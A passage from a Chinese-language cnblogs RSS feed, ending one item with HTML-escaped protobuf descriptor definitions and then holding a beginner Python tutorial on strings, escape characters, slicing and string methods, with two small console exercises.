    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; before (but not connected to) the current element. Each paragraph,
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; separated by empty lines, will be one comment element in the repeated
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; field.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Only the comment content is provided; comment markers (e.g. &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;) are
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; stripped out.  For block comments, leading whitespace and an asterisk
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; will be stripped from the beginning of each line other than the first.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Newlines are included in the output.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Examples:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional int32 foo = 1;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Comment attached to foo.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Comment attached to bar.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional int32 bar = 2;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional string baz = 3;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Comment attached to baz.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Another line attached to baz.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Comment attached to qux.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Another line attached to qux.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional double qux = 4;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Detached comment for corge. This is not leading or trailing comments
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; to qux or corge because there are blank lines separating it from
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; both.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Detached comment for corge paragraph 2.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional string corge = 5;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   /* Block comment attached
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    * to corge.  Leading asterisks
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    * will be removed. */
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   /* Block comment attached to
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    * grault. */
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional int32 grault = 6;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;   &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ignored detached comments.&lt;/span&gt;
    optional &lt;span&gt;string&lt;/span&gt; leading_comments = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
    optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; trailing_comments = &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;
    repeated &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; leading_detached_comments = &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;
  }
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Describes the relationship between generated code and its original source
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; file. A GeneratedCodeInfo message is associated with only one generated
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; source file, but may contain references to different source .proto files.&lt;/span&gt;
&lt;span&gt;message GeneratedCodeInfo {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; An Annotation connects some span of text in generated code to an element
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; of its generating .proto file.&lt;/span&gt;
  repeated Annotation annotation = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  message Annotation {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies the element in the original source .proto file. This field
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is formatted the same as SourceCodeInfo.Location.path.&lt;/span&gt;
    repeated int32 path = &lt;span&gt;1&lt;/span&gt; [packed=&lt;span&gt;true&lt;/span&gt;&lt;span&gt;];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies the filesystem path to the original source .proto.&lt;/span&gt;
    optional &lt;span&gt;string&lt;/span&gt; source_file = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies the starting offset in bytes in the generated code
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; that relates to the identified object.&lt;/span&gt;
    optional int32 begin = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies the ending offset in bytes in the generated code that
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; relates to the identified offset. The end offset should be one past
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the last relevant byte (so the length of the text = end - begin).&lt;/span&gt;
    optional int32 end = &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;
  }
}&lt;/span&gt;
&lt;/pre&gt;</description>
<pubDate>Wed, 04 Jul 2018 15:55:00 +0000</pubDate>
<dc:creator>王庆东mas</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/x-poior/p/9266087.html</dc:identifier>
</item>
<item>
<title>ParisGabriel：Python无止境 day06 - ParisGabriel</title>
<link>http://www.cnblogs.com/ParisGabriel/p/9266051.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ParisGabriel/p/9266051.html</guid>
<description>&lt;p&gt;&lt;strong&gt;字符串：str&lt;/strong&gt;&lt;br/&gt;用来记录文本信息&lt;br/&gt;字符串的表示方式：&lt;br/&gt;在非注释中凡是用引号括起来的部分都是字符串&lt;br/&gt;‘’ 单引号&lt;br/&gt;“” 双引号&lt;br/&gt;''' ''' 三单引&lt;br/&gt;&quot;&quot;&quot; &quot;&quot;&quot; 三双引&lt;br/&gt;有内容代表非空字符串否则是空字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;区别：&lt;/strong&gt;&lt;br/&gt;单引号内的双引号不算结束符&lt;br/&gt;双引号内的单引号不算结束符&lt;br/&gt;三引号内的换行会自动转换为换行符&lt;br/&gt;三引号内可以包含单引号和双引号&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;隐式字符串拼接：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
s = &quot;I'm a I'm a programmer&quot; 'heoll &quot;wored&quot;'
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;转移符：&lt;/strong&gt;&lt;br/&gt;\' 单引号&lt;br/&gt;\&quot; 双引号&lt;br/&gt;\\ 单反斜杠&lt;br/&gt;\n 换行&lt;br/&gt;\r 返回光标至行首&lt;br/&gt;\t 水平制表符&lt;br/&gt;\v 垂直制表符&lt;br/&gt;\f 换页&lt;br/&gt;\b 倒退&lt;br/&gt;\0 空字符，字符值为0&lt;br/&gt;\xXX ，XX为两位16进制表示的自符&lt;br/&gt;\uXXXX ，XXXX为4个16进制的Unicode16字符&lt;br/&gt;\UXXXXXXXX ，8个16进制表示的Unicode32字符&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704221401920-17232853.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ASCII编码：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;man ASCII&lt;/strong&gt; ：查看帮助文档命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704221617655-733576821.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;&lt;strong&gt;常用ASCII编码：&lt;/strong&gt;&lt;br/&gt;字符 十进制 十六进制&lt;br/&gt;0 48 0x30&lt;br/&gt;A 65 0x41&lt;br/&gt;a 97 0x61&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unicode：&lt;/strong&gt;&lt;br/&gt;统一编码，分为Unicode16、Unicode32&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列的概念：&lt;/strong&gt;&lt;br/&gt;字符串就是序列&lt;br/&gt;&lt;strong&gt;函数：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;len（x）&lt;/strong&gt; 返回字符串的字符个数&lt;br/&gt;&lt;strong&gt;raw 字符串：&lt;/strong&gt;&lt;br/&gt;让转义符号\无效&lt;br/&gt;格式：&lt;br/&gt;&lt;strong&gt;r‘字符串内容’&lt;/strong&gt;&lt;br/&gt;print（r“\n\\\t”）&lt;br/&gt;字符串的运算：&lt;br/&gt;+ 用于拼接字符串&lt;br/&gt;* 用于生成重复字符串&lt;br/&gt;字符串的相乘只能与整数&lt;br/&gt;+=   *= 与其他符合运算符相同&lt;br/&gt;&lt;strong&gt;in / not in 运算符：&lt;/strong&gt;&lt;br/&gt;用于判断某个字符串是否在&lt;br/&gt;相当于字符串出现过 如果出现过返回true 否则返回false&lt;br/&gt;&lt;strong&gt;字符串的比较运算：&lt;/strong&gt;&lt;br/&gt;&amp;gt; &amp;gt;= &amp;lt; &amp;lt;= == !=&lt;br/&gt;依次按照编码进行比较，直到最短字符串结束为止&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;索引（下标）：&lt;/strong&gt;&lt;br/&gt;Python的字符串是不可以改变字符序列的&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;index：&lt;/strong&gt;&lt;br/&gt;字符串[整数表达式]&lt;br/&gt;Python序列都可以用索引来访问序列中的对象&lt;br/&gt;Python的序列正向索引是冲0开始的最后一个索引为len（s）-1&lt;br/&gt;Python序列的反响索引是从-1开始的 -1是最后一个 第一个是 -len（s）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704222049087-782732496.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;切片：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;slice&lt;/strong&gt;&lt;br/&gt;从一个字符串序列中取出相应的元素重新组成一个字符串系列&lt;br/&gt;&lt;strong&gt;语法：&lt;/strong&gt;&lt;br/&gt;字符串序列[(开始索引b)：（结束索引e）：（步长s）]&lt;br/&gt;小括号括起的部分代表可省略&lt;br/&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;br/&gt;开始索引是切片开始切下的位置，0代表第一个元素，1代表第二个，-1代表最后一个&lt;br/&gt;结束索引是切片的终止索引（但不包括终止点）&lt;br/&gt;&lt;strong&gt;步长：&lt;/strong&gt;&lt;br/&gt;是切片每次获取当前元素后移动的方向和偏移量&lt;br/&gt;没有步长，相当于取值完成后向右移动一个索引的位置默认1&lt;br/&gt;&lt;strong&gt;当步长代表为正数时取正向切片&lt;/strong&gt; 步长默认为1 开始位置为0 结束为len（s）步长代表下一次索引的取值增长值&lt;br/&gt;&lt;strong&gt;当步长为负数时 取反向切片&lt;/strong&gt; 默认的起始位置是最后一个元素，终止位置是第一个元素的前一个位置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704222355439-495215236.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Python3中常用于序列函数：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;len（x）&lt;/strong&gt;返回序列长度&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704222634137-1886692134.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;max（x）&lt;/strong&gt;返回序列最大值元素&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704222931221-934071121.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;min（x）&lt;/strong&gt;返回序列最小止元素&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704222842479-1739161182.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字符串编码转换函数：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;ord（c）&lt;/strong&gt;返回一个字符的Unicode值（十进制）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704223048628-1285127190.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;chr（i）&lt;/strong&gt;返回 i这个整数的值所对应的字符&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704223139213-166885834.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;整数转字符串函数：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;bin（i）&lt;/strong&gt; 将整数转换为二进制的字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;oct（i）&lt;/strong&gt; 将整数转换为八进制的字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;hex（i）&lt;/strong&gt; 将整数转换为十六进制的字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704223343453-1499011606.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;二进制转换其他进制是非常好转的 &lt;strong&gt;如图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;100=4  011=5 10=2  156=0o452 （八进制）&lt;/p&gt;
&lt;p&gt;1100=c 1001=9       156=0x9c　（十六进制）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字符串的构造函数：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;str（obj=“”）&lt;/strong&gt; 将对象转换为字符串&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常用的字符串方法：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;文档参见：&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;对象.方法名(方法传参)&lt;/strong&gt;&lt;br/&gt;&quot;abc&quot;.isalpha() # 语法是对的&lt;br/&gt;123.isalpha() # 语法是错的&lt;br/&gt;&lt;strong&gt;方法 说明&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;S.isdigit()&lt;/strong&gt; 判断字符串中的字符是否全为数字&lt;br/&gt;&lt;strong&gt;S.isalpha()&lt;/strong&gt; 判断字符串是否全为英文字母&lt;br/&gt;&lt;strong&gt;S.islower()&lt;/strong&gt; 判断字符串所有字符是否全为小写英文字母&lt;br/&gt;&lt;strong&gt;S.isupper()&lt;/strong&gt; 判断字符串所有字符是否全为大写英文字母&lt;br/&gt;&lt;strong&gt;S.isspace()&lt;/strong&gt; 判断字符串是否全为空白字符&lt;br/&gt;&lt;strong&gt;S.center(width[,fill])&lt;/strong&gt; 将原字符串居中，左右默认填充空格 width：所居中字符串的长度 fill：默认填充空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704224632783-625808903.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;S.count(sub[, start[,end]])&lt;/strong&gt; 获取一个字符串中子串的个数 sub：所要获取的字符串 start：起始位置 end：结束位置&lt;br/&gt;&lt;strong&gt;S.find(sub[, start[,end]])&lt;/strong&gt; 获取字符串中子串sub的索引,失败返回-1 start：起始位置 end：结束位置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704225539255-354650085.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;S.strip()&lt;/strong&gt; 返回去掉左右空白字符的字符串&lt;br/&gt;&lt;strong&gt;S.lstrip()&lt;/strong&gt; 返回去掉左侧空白字符的字符串&lt;br/&gt;&lt;strong&gt;S.rstrip()&lt;/strong&gt; 返回去掉右侧空白字符的字符串&lt;br/&gt;&lt;strong&gt;S.upper()&lt;/strong&gt; 生成将英文转换为大写的字符串&lt;br/&gt;&lt;strong&gt;S.lower()&lt;/strong&gt; 生成将英文转换为小写的字符串&lt;br/&gt;&lt;strong&gt;S.replace(old, new[, count])&lt;/strong&gt; 将原字符串的old用new代替，生成一个新的字符串 count：更换的次数&lt;br/&gt;&lt;strong&gt;S.startswith(prefix[, start[, end]])&lt;/strong&gt; 返回S是否是以prefix开头，如果以prefix开头返回True,否则返回False,&lt;br/&gt;&lt;strong&gt;S.endswith(suffix[, start[, end]])&lt;/strong&gt; 返回S是否是以suffix结尾，如果以suffix结尾返回True,否则返回False&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704225736528-1488629480.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以下是不常用的&lt;br/&gt;&lt;strong&gt;S.title()&lt;/strong&gt; 生成每个英文单词的首字母大写字符串&lt;br/&gt;&lt;strong&gt;S.isnumeric()&lt;/strong&gt; 判断字符串是否全为数字字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;练习：&lt;/strong&gt;&lt;br/&gt;1.&lt;br/&gt;输入一个字符串用s绑定&lt;br/&gt;判断输入有几个人空格&lt;br/&gt;将原字符串的左右空格空白符去掉&lt;br/&gt;打印剩余的字符个数&lt;br/&gt;判断输入的是否是数字&lt;br/&gt;如果是数字判断这个数是否大于100&lt;/p&gt;
&lt;p&gt; 答案：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;43&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
print(&quot;Answer to question 1:&quot;, &quot;\n&quot;)

s = input(&quot;plaese input at will string:&quot;)
print(&quot;you input string blank have &quot;, s.count(&quot; &quot;))
print(&quot;string surplus:&quot;, len(s.strip()))
if s.isdigit() is True:
    if int(s) &amp;gt; 100:
        print(&quot;input integer:&quot;, s, &quot;&amp;gt;100&quot;)
    else:
        print(&quot;input integer:&quot;, s, &quot;&amp;lt;100&quot;)
else:
    print(&quot;you input contain alpha:&quot;, s)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;2.&lt;br/&gt;输入3行文字，让这三行文字在一个方框内居中显示&lt;br/&gt;显示如下：&lt;br/&gt;+---------------+&lt;br/&gt;|       hello      |&lt;br/&gt;|    123123    |&lt;br/&gt;| 　　　　　 |&lt;br/&gt;+---------------+&lt;br/&gt;&lt;strong&gt;注：请不要输入中文&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
print(&quot;Answer to question 2:&quot;, &quot;\n&quot;)

a = input(&quot;plaese input at will string 1:&quot;)
b = input(&quot;plaese input at will string 2:&quot;)
c = input(&quot;plaese input at will string 3:&quot;)
top = a
if top &amp;lt; b:
    top = b
if top &amp;lt; c:
    top = c
print(&quot;+&quot; + &quot;-&quot; * (len(top) * 2 + 10) + &quot;+&quot;)
print(&quot;|&quot; + a.center(len(top) * 2 + 10) + &quot;|&quot;)
print(&quot;|&quot; + b.center(len(top) * 2 + 10) + &quot;|&quot;)
print(&quot;|&quot; + c.center(len(top) * 2 + 10) + &quot;|&quot;)
print(&quot;+&quot; + &quot;-&quot; * (len(top) * 2 + 10) + &quot;+&quot;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704233943216-1921621748.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1430617/201807/1430617-20180704234153609-819498818.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



</description>
<pubDate>Wed, 04 Jul 2018 15:43:00 +0000</pubDate>
<dc:creator>ParisGabriel</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ParisGabriel/p/9266051.html</dc:identifier>
</item>
</channel>
</rss>